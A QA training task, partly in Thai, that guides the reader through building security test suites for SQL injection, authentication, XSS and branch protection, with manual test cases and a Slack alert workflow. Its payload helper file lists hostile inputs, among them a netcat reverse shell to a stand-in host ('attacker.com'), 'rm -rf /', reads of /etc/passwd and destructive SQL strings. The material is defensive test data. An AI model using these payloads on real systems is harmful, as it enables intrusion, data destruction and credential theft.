# Task 3: Design Security Test Cases and Verify Branch Protection

**Role**: QA
**Estimated Time**: 4-5 hours
**Feature**: Security Testing / Branch Protection Validation

---

## Objectives

- ออกแบบ Security Test Cases ตาม OWASP Top 10
- สร้าง Negative Test Cases
- ตรวจสอบ Branch Protection Rules
- ทดสอบระบบ Alerting

## Prerequisites

- Understanding of OWASP Top 10 vulnerabilities
- Access to test environment
- Branch protection rules configured
- Security tools available (Burp Suite, ZAP, etc.)

---

## Part A: Security Test Cases

### Step 1: Create Test Suite Structure

สร้างโครงสร้างไฟล์สำหรับ Security Tests:

```
tests/
├── security/
│   ├── injection/
│   │   ├── sql-injection.test.js
│   │   ├── nosql-injection.test.js
│   │   └── command-injection.test.js
│   ├── authentication/
│   │   ├── auth-bypass.test.js
│   │   ├── session-management.test.js
│   │   └── password-policy.test.js
│   ├── access-control/
│   │   ├── idor.test.js
│   │   ├── privilege-escalation.test.js
│   │   └── forced-browsing.test.js
│   ├── xss/
│   │   ├── reflected-xss.test.js
│   │   ├── stored-xss.test.js
│   │   └── dom-xss.test.js
│   ├── data-exposure/
│   │   ├── sensitive-data.test.js
│   │   └── error-handling.test.js
│   ├── configuration/
│   │   ├── security-headers.test.js
│   │   └── cors.test.js
│   └── rate-limiting/
│       └── rate-limit.test.js
└── helpers/
    ├── security-payloads.js
    └── test-utils.js
```

---

### Step 2: Create Security Payloads Helper

สร้างไฟล์ `tests/helpers/security-payloads.js`:

```javascript
// Security Test Payloads
// WARNING: These payloads are for TESTING ONLY
// Never use against systems without authorization

module.exports = {
  // SQL Injection Payloads
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "admin'--",
    "1' OR '1'='1' /*",
    "' UNION SELECT * FROM users--",
    "'; INSERT INTO users VALUES('hacker', 'password'); --",
    "' OR 1=1--",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir'); --",
    "1; UPDATE users SET role='admin' WHERE username='attacker'--"
  ],

  // NoSQL Injection Payloads
  noSqlInjection: [
    { "$gt": "" },
    { "$ne": null },
    { "$where": "sleep(1000)" },
    { "$regex": ".*" },
    { "$or": [{ "x": 1 }, { "y": 1 }] }
  ],

  // XSS Payloads
  xss: [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<svg/onload=alert(1)>',
    '<img src=x onerror="javascript:alert(1)">',
    '"><img src=x onerror=alert(1)><"'
  ],

  // Command Injection Payloads
  commandInjection: [
    '; ls -la',
    '| cat /etc/passwd',
    '`cat /etc/passwd`',
    '$(cat /etc/passwd)',
    '; rm -rf /',
    '| nc attacker.com 1234 -e /bin/sh',
    '|| ping -c 1 attacker.com'
  ],

  // Path Traversal Payloads
  pathTraversal: [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '..%2F..%2F..%2Fetc%2Fpasswd',
    '..%252F..%252F..%252Fetc%252Fpasswd',
    '/etc/passwd%00',
    '....\\....\\....\\windows\\system32\\config\\sam'
  ],

  // LDAP Injection Payloads
  ldapInjection: [
    '*',
    '*)(&',
    '*)(|(&',
    'admin)(&)',
    '*)(objectClass=*)'
  ],

  // Template Injection Payloads
  templateInjection: [
    '${7*7}',
    '{{7*7}}',
    '#{7*7}',
    '<%= 7*7 %>',
    '{{constructor.constructor("return this")()}}'
  ],

  // Weak Passwords
  weakPasswords: [
    '123456',
    'password',
    'abc123',
    'qwerty',
    'admin',
    '12345678',
    'letmein',
    'welcome',
    'password123',
    ''
  ],

  // Invalid Inputs
  invalidInputs: [
    null,
    undefined,
    '',
    ' ',
    '\t',
    '\n',
    'a'.repeat(10000),
    '\0',
    '\u0000',
    -1,
    0,
    Number.MAX_SAFE_INTEGER + 1,
    NaN,
    Infinity,
    [],
    {},
    true,
    false
  ]
};
```

---

### Step 3: Create SQL Injection Tests

สร้างไฟล์ `tests/security/injection/sql-injection.test.js`:

```javascript
const request = require('supertest');
const app = require('../../../src/app');
const { sqlInjection } = require('../../helpers/security-payloads');
const db = require('../../../src/database');

describe('SQL Injection Protection', () => {
  beforeAll(async () => {
    // Setup test database
    await db.migrate.latest();
    await db.seed.run();
  });

  afterAll(async () => {
    await db.destroy();
  });

  describe('Login Endpoint', () => {
    sqlInjection.forEach((payload) => {
      it(`should reject SQL injection in username: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            username: payload,
            password: 'anypassword'
          });

        // Should not return 200 (successful login)
        expect(response.status).not.toBe(200);

        // Should not contain sensitive data
        expect(response.body).not.toHaveProperty('token');
        expect(response.body).not.toHaveProperty('user');

        // Verify database is not affected
        const users = await db('users').select('*');
        expect(users.length).toBeGreaterThan(0);
      });

      it(`should reject SQL injection in password: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            username: 'validuser',
            password: payload
          });

        expect(response.status).not.toBe(200);
        expect(response.body).not.toHaveProperty('token');
      });
    });
  });

  describe('Search Endpoint', () => {
    sqlInjection.forEach((payload) => {
      it(`should sanitize SQL injection in search query: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .get('/api/products/search')
          .query({ q: payload });

        // Should not cause server error
        expect(response.status).not.toBe(500);

        // Should not return all data
        expect(response.body.length).toBeLessThan(100);

        // Verify database integrity
        const products = await db('products').count('* as count');
        expect(products[0].count).toBeGreaterThan(0);
      });
    });
  });

  describe('User Profile Update', () => {
    let authToken;

    beforeAll(async () => {
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ username: 'testuser', password: 'validpassword' });
      authToken = loginResponse.body.token;
    });

    sqlInjection.forEach((payload) => {
      it(`should reject SQL injection in profile update: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .put('/api/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: payload,
            email: 'test@example.com'
          });

        expect(response.status).not.toBe(200);

        // Verify user data is not corrupted
        const user = await db('users').where('username', 'testuser').first();
        expect(user.name).not.toBe(payload);
      });
    });
  });

  describe('Parameterized Query Verification', () => {
    it('should use parameterized queries', async () => {
      // This test verifies that the application uses parameterized queries
      // by checking the query logs or using a mock

      const maliciousId = "1 OR 1=1; DELETE FROM users; --";

      const response = await request(app)
        .get(`/api/users/${encodeURIComponent(maliciousId)}`);

      // Should return 404 or 400, not 200 or 500
      expect([400, 404]).toContain(response.status);

      // Verify no users were deleted
      const userCount = await db('users').count('* as count');
      expect(userCount[0].count).toBeGreaterThan(0);
    });
  });
});
```

---

### Step 4: Create Authentication Tests

สร้างไฟล์ `tests/security/authentication/auth-security.test.js`:

```javascript
const request = require('supertest');
const app = require('../../../src/app');
const { weakPasswords } = require('../../helpers/security-payloads');
const db = require('../../../src/database');

describe('Authentication Security', () => {
  describe('Account Lockout', () => {
    beforeEach(async () => {
      // Reset lockout for test user
      await db('users')
        .where('email', 'lockout-test@example.com')
        .update({ failed_attempts: 0, locked_until: null });
    });

    it('should lock account after 5 failed attempts', async () => {
      const email = 'lockout-test@example.com';

      // Make 5 failed login attempts
      for (let i = 0; i < 5; i++) {
        await request(app)
          .post('/api/auth/login')
          .send({ email, password: 'wrongpassword' });
      }

      // 6th attempt should be blocked even with correct password
      const response = await request(app)
        .post('/api/auth/login')
        .send({ email, password: 'correctpassword' });

      expect(response.status).toBe(423); // Locked
      expect(response.body.error).toContain('locked');
      expect(response.body.lockoutMinutes).toBeDefined();
    });

    it('should reset failed attempts after successful login', async () => {
      const email = 'reset-test@example.com';

      // Make 3 failed attempts
      for (let i = 0; i < 3; i++) {
        await request(app)
          .post('/api/auth/login')
          .send({ email, password: 'wrongpassword' });
      }

      // Successful login
      await request(app)
        .post('/api/auth/login')
        .send({ email, password: 'correctpassword' });

      // Verify attempts reset
      const user = await db('users').where('email', email).first();
      expect(user.failed_attempts).toBe(0);
    });

    it('should track failed attempts per user', async () => {
      // Failed attempt for user1
      await request(app)
        .post('/api/auth/login')
        .send({ email: 'user1@example.com', password: 'wrong' });

      // User2 should not be affected
      const response = await request(app)
        .post('/api/auth/login')
        .send({ email: 'user2@example.com', password: 'correctpassword' });

      expect(response.status).toBe(200);
    });
  });

  describe('Password Policy', () => {
    weakPasswords.forEach((password) => {
      it(`should reject weak password: "${password || '(empty)'}"`, async () => {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: 'newuser@example.com',
            password: password,
            name: 'New User'
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toMatch(/password/i);
      });
    });

    it('should require minimum length of 12 characters', async () => {
      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'newuser@example.com',
          password: 'Short1!',
          name: 'New User'
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('12 characters');
    });

    it('should require uppercase, lowercase, number, and special character', async () => {
      const testCases = [
        { password: 'onlylowercase12!', missing: 'uppercase' },
        { password: 'ONLYUPPERCASE12!', missing: 'lowercase' },
        { password: 'NoNumbersHere!!', missing: 'number' },
        { password: 'NoSpecialChar123', missing: 'special character' }
      ];

      for (const testCase of testCases) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            email: 'newuser@example.com',
            password: testCase.password,
            name: 'New User'
          });

        expect(response.status).toBe(400);
      }
    });

    it('should accept strong passwords', async () => {
      const strongPassword = 'StrongP@ssw0rd!2025';

      const response = await request(app)
        .post('/api/auth/register')
        .send({
          email: 'strongpass@example.com',
          password: strongPassword,
          name: 'New User'
        });

      expect(response.status).toBe(201);
    });
  });

  describe('Session Management', () => {
    it('should invalidate session after logout', async () => {
      // Login
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ email: 'session@example.com', password: 'ValidP@ssw0rd!' });

      const token = loginResponse.body.token;

      // Verify session works
      const verifyResponse = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${token}`);

      expect(verifyResponse.status).toBe(200);

      // Logout
      await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${token}`);

      // Session should be invalid
      const afterLogoutResponse = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${token}`);

      expect(afterLogoutResponse.status).toBe(401);
    });

    it('should invalidate all sessions after password change', async () => {
      // Login on "device 1"
      const device1Login = await request(app)
        .post('/api/auth/login')
        .send({ email: 'multidevice@example.com', password: 'OldP@ssw0rd!' });

      const device1Token = device1Login.body.token;

      // Login on "device 2"
      const device2Login = await request(app)
        .post('/api/auth/login')
        .send({ email: 'multidevice@example.com', password: 'OldP@ssw0rd!' });

      const device2Token = device2Login.body.token;

      // Change password using device 1
      await request(app)
        .post('/api/auth/change-password')
        .set('Authorization', `Bearer ${device1Token}`)
        .send({
          currentPassword: 'OldP@ssw0rd!',
          newPassword: 'NewP@ssw0rd!2025'
        });

      // Device 2 session should be invalid
      const device2Response = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${device2Token}`);

      expect(device2Response.status).toBe(401);
    });

    it('should have session expiration', async () => {
      // This test would typically use time manipulation or short expiry for testing
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({ email: 'expiry@example.com', password: 'ValidP@ssw0rd!' });

      const token = loginResponse.body.token;
      const expiresIn = loginResponse.body.expiresIn;

      // Verify expiration is set
      expect(expiresIn).toBeDefined();
      expect(expiresIn).toBeLessThanOrEqual(3600); // Max 1 hour for sensitive apps
    });
  });

  describe('Brute Force Protection', () => {
    it('should implement rate limiting on login endpoint', async () => {
      const requests = [];

      // Make 100 rapid requests
      for (let i = 0; i < 100; i++) {
        requests.push(
          request(app)
            .post('/api/auth/login')
            .send({ email: 'ratelimit@example.com', password: 'test' })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);

      // Some requests should be rate limited
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    it('should include rate limit headers', async () => {
      const response = await request(app)
        .post('/api/auth/login')
        .send({ email: 'headers@example.com', password: 'test' });

      expect(response.headers['x-ratelimit-limit']).toBeDefined();
      expect(response.headers['x-ratelimit-remaining']).toBeDefined();
    });
  });
});
```

---

### Step 5: Create XSS Protection Tests

สร้างไฟล์ `tests/security/xss/xss-protection.test.js`:

```javascript
const request = require('supertest');
const app = require('../../../src/app');
const { xss } = require('../../helpers/security-payloads');

describe('XSS Protection', () => {
  let authToken;

  beforeAll(async () => {
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({ email: 'xss-test@example.com', password: 'ValidP@ssw0rd!' });
    authToken = loginResponse.body.token;
  });

  describe('Input Sanitization', () => {
    xss.forEach((payload) => {
      it(`should sanitize XSS in user profile: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .put('/api/users/profile')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            name: payload,
            bio: payload
          });

        // Either reject or sanitize
        if (response.status === 200) {
          // If accepted, content should be sanitized
          expect(response.body.name).not.toContain('<script>');
          expect(response.body.name).not.toContain('onerror');
          expect(response.body.name).not.toContain('javascript:');
        }
      });

      it(`should sanitize XSS in comments: ${payload.substring(0, 30)}...`, async () => {
        const response = await request(app)
          .post('/api/comments')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            postId: 1,
            content: payload
          });

        if (response.status === 201) {
          expect(response.body.content).not.toMatch(/<script[^>]*>/i);
          expect(response.body.content).not.toMatch(/on\w+\s*=/i);
        }
      });
    });
  });

  describe('Output Encoding', () => {
    it('should HTML encode user-generated content in API responses', async () => {
      // Create content with HTML
      await request(app)
        .post('/api/posts')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          title: '<b>Bold Title</b>',
          content: 'Normal content with <script>alert(1)</script>'
        });

      // Retrieve and verify encoding
      const response = await request(app)
        .get('/api/posts/1')
        .set('Accept', 'application/json');

      expect(response.body.title).not.toContain('<b>');
      expect(response.body.content).not.toContain('<script>');
    });

    it('should set Content-Type header correctly', async () => {
      const response = await request(app)
        .get('/api/users/me')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.headers['content-type']).toContain('application/json');
    });
  });

  describe('Security Headers', () => {
    it('should have Content-Security-Policy header', async () => {
      const response = await request(app).get('/');

      const csp = response.headers['content-security-policy'];
      expect(csp).toBeDefined();
      expect(csp).toContain("default-src");
    });

    it('should have X-XSS-Protection header', async () => {
      const response = await request(app).get('/');

      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    });

    it('should have X-Content-Type-Options header', async () => {
      const response = await request(app).get('/');

      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });
  });

  describe('DOM-based XSS Prevention', () => {
    it('should not reflect URL parameters in HTML', async () => {
      const xssParam = encodeURIComponent('<script>alert(1)</script>');

      const response = await request(app)
        .get(`/search?q=${xssParam}`)
        .set('Accept', 'text/html');

      // If HTML response, should be encoded
      if (response.headers['content-type'].includes('text/html')) {
        expect(response.text).not.toContain('<script>alert(1)</script>');
        expect(response.text).toContain('&lt;script&gt;');
      }
    });
  });
});
```

---

## Part B: Branch Protection Validation

### Step 6: Create Branch Protection Tests

สร้างไฟล์ `tests/security/branch-protection.test.js`:

```javascript
const { Octokit } = require('@octokit/rest');

describe('Branch Protection Validation', () => {
  let octokit;
  const owner = process.env.GITHUB_OWNER;
  const repo = process.env.GITHUB_REPO;

  beforeAll(() => {
    octokit = new Octokit({
      auth: process.env.GITHUB_TOKEN
    });
  });

  describe('Main Branch', () => {
    let protection;

    beforeAll(async () => {
      const { data } = await octokit.repos.getBranchProtection({
        owner,
        repo,
        branch: 'main'
      });
      protection = data;
    });

    it('should require pull request reviews', () => {
      expect(protection.required_pull_request_reviews).toBeDefined();
    });

    it('should require at least 2 approving reviews', () => {
      expect(
        protection.required_pull_request_reviews.required_approving_review_count
      ).toBeGreaterThanOrEqual(2);
    });

    it('should dismiss stale reviews', () => {
      expect(
        protection.required_pull_request_reviews.dismiss_stale_reviews
      ).toBe(true);
    });

    it('should require code owner reviews', () => {
      expect(
        protection.required_pull_request_reviews.require_code_owner_reviews
      ).toBe(true);
    });

    it('should require status checks to pass', () => {
      expect(protection.required_status_checks).toBeDefined();
    });

    it('should have required status checks configured', () => {
      const contexts = protection.required_status_checks.contexts;
      expect(contexts).toContain('CI');
      expect(contexts).toContain('Tests');
      expect(contexts).toContain('Security Scan');
    });

    it('should require branches to be up to date', () => {
      expect(protection.required_status_checks.strict).toBe(true);
    });

    it('should require conversation resolution', () => {
      expect(protection.required_conversation_resolution.enabled).toBe(true);
    });

    it('should enforce rules for administrators', () => {
      expect(protection.enforce_admins.enabled).toBe(true);
    });

    it('should not allow force pushes', () => {
      expect(protection.allow_force_pushes.enabled).toBe(false);
    });

    it('should not allow deletions', () => {
      expect(protection.allow_deletions.enabled).toBe(false);
    });
  });

  describe('Develop Branch', () => {
    let protection;

    beforeAll(async () => {
      const { data } = await octokit.repos.getBranchProtection({
        owner,
        repo,
        branch: 'develop'
      });
      protection = data;
    });

    it('should require at least 1 approving review', () => {
      expect(
        protection.required_pull_request_reviews.required_approving_review_count
      ).toBeGreaterThanOrEqual(1);
    });

    it('should require status checks', () => {
      expect(protection.required_status_checks).toBeDefined();
    });

    it('should not allow force pushes', () => {
      expect(protection.allow_force_pushes.enabled).toBe(false);
    });
  });
});
```

---

### Step 7: Manual Branch Protection Test Cases

```markdown
# Branch Protection Manual Test Cases

## Test Suite: Branch Protection Validation

### TC-BP-001: Required Reviews Enforcement

**Objective**: Verify that PRs require the configured number of approvals

**Preconditions**:
- Branch protection enabled on main
- Required approvals set to 2

**Steps**:
1. Create feature branch from main
2. Make a code change
3. Push to remote
4. Create PR to main
5. Attempt to merge without approvals
6. Get 1 approval
7. Attempt to merge
8. Get 2nd approval
9. Attempt to merge

**Expected Results**:
| Step | Expected Result |
|------|-----------------|
| 5 | Merge button disabled, message shows "2 approving reviews required" |
| 7 | Merge button disabled, message shows "1 more approving review required" |
| 9 | Merge button enabled |

**Actual Results**: [Record during testing]

**Status**: [ ] Pass [ ] Fail

---

### TC-BP-002: Status Checks Required

**Objective**: Verify that all required status checks must pass before merge

**Steps**:
1. Create PR to main
2. Introduce a test failure
3. Wait for CI to complete
4. Attempt to merge
5. Fix the test failure
6. Wait for CI to pass
7. Attempt to merge

**Expected Results**:
| Step | Expected Result |
|------|-----------------|
| 4 | Merge blocked, shows "Required status checks must pass" |
| 7 | Merge allowed (with approvals) |

**Actual Results**: [Record during testing]

**Status**: [ ] Pass [ ] Fail

---

### TC-BP-003: Force Push Protection

**Objective**: Verify that force pushes are blocked on protected branches

**Steps**:
1. Clone repository
2. Checkout main branch
3. Make and commit a change locally
4. Amend the commit
5. Attempt force push

**Commands**:
```bash
git checkout main
git commit --allow-empty -m "Test commit"
git commit --amend -m "Amended commit"
git push --force origin main
```

**Expected Result**:
```
remote: error: GH006: Protected branch update failed for refs/heads/main.
remote: error: Cannot force-push to a protected branch
```

**Actual Results**: [Record during testing]

**Status**: [ ] Pass [ ] Fail

---

### TC-BP-004: Branch Deletion Protection

**Objective**: Verify that protected branches cannot be deleted

**Steps**:
1. Attempt to delete main branch via GitHub UI
2. Attempt to delete main branch via git command

**Command**:
```bash
git push origin --delete main
```

**Expected Result**:
```
remote: error: GH006: Protected branch update failed for refs/heads/main.
remote: error: Cannot delete a protected branch
```

**Actual Results**: [Record during testing]

**Status**: [ ] Pass [ ] Fail

---

### TC-BP-005: CODEOWNERS Review Required

**Objective**: Verify that CODEOWNERS must approve changes to their files

**Steps**:
1. Create PR modifying file owned by specific team
2. Get approval from non-owner
3. Attempt to merge
4. Get approval from CODEOWNER
5. Attempt to merge

**Expected Results**:
| Step | Expected Result |
|------|-----------------|
| 3 | Merge blocked, shows "Review required from code owner" |
| 5 | Merge allowed |

**Actual Results**: [Record during testing]

**Status**: [ ] Pass [ ] Fail
```

---

## Part C: Alert System Testing

### Step 8: Alert Testing Workflow

สร้างไฟล์ `.github/workflows/test-alerts.yml`:

```yaml
name: Test Alert System

on:
  workflow_dispatch:
    inputs:
      test_type:
        description: 'Type of alert to test'
        required: true
        type: choice
        options:
          - slack-notification
          - email-notification
          - security-alert

jobs:
  test-slack:
    if: github.event.inputs.test_type == 'slack-notification'
    runs-on: ubuntu-latest
    steps:
    - name: Send Test Alert to Slack
      uses: slackapi/slack-github-action@v1
      with:
        payload: |
          {
            "text": ":test_tube: Test Alert",
            "blocks": [
              {
                "type": "header",
                "text": {
                  "type": "plain_text",
                  "text": "Test Alert - Alert System Verification"
                }
              },
              {
                "type": "section",
                "text": {
                  "type": "mrkdwn",
                  "text": "This is a test alert to verify the notification system is working correctly."
                }
              },
              {
                "type": "context",
                "elements": [
                  {
                    "type": "mrkdwn",
                    "text": "Triggered by: ${{ github.actor }} | Time: ${{ github.event.head_commit.timestamp }}"
                  }
                ]
              }
            ]
          }
      env:
        SLACK_WEBHOOK_URL: ${{ secrets.SLACK_SECURITY_WEBHOOK }}

    - name: Verify Slack notification
      run: echo "Please check Slack channel for test message"

  test-security-alert:
    if: github.event.inputs.test_type == 'security-alert'
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4

    - name: Create test package.json with vulnerability
      run: |
        echo '{"name":"test","dependencies":{"lodash":"4.17.0"}}' > test-package.json

    - name: Run npm audit on test file
      run: |
        cd $(dirname test-package.json)
        npm audit --json || true
      continue-on-error: true

    - name: Send Security Alert
      uses: slackapi/slack-github-action@v1
      with:
        payload: |
          {
            "text": ":warning: Security Test Alert",
            "blocks": [
              {
                "type": "section",
                "text": {
                  "type": "mrkdwn",
                  "text": "*Security Test Alert*\nThis is a simulated security alert for testing purposes."
                }
              }
            ]
          }
      env:
        SLACK_WEBHOOK_URL: ${{ secrets.SLACK_SECURITY_WEBHOOK }}
```

---

## Deliverables

✅ **Test Suites Created**:
1. SQL Injection tests
2. Authentication security tests
3. XSS protection tests
4. Access control tests
5. Branch protection validation tests

📋 **Documentation**:
- Security test payloads library
- Manual test cases for branch protection
- Alert testing procedures

---

## Test Execution Checklist

- [ ] All automated security tests passing
- [ ] Branch protection rules validated
- [ ] Alert system tested
- [ ] Manual test cases executed
- [ ] Results documented
- [ ] Issues reported

---

**Related Tasks**:
- [Task 1: Branch Protection](Task-01-PM-Branch-Protection.md)
- [Task 2: Dependabot & Secret Scanning](Task-02-DEV-Dependabot-SecretScanning.md)

---

**Prepared by**: QA Team
**Last Updated**: November 2025
**Version**: 1.0
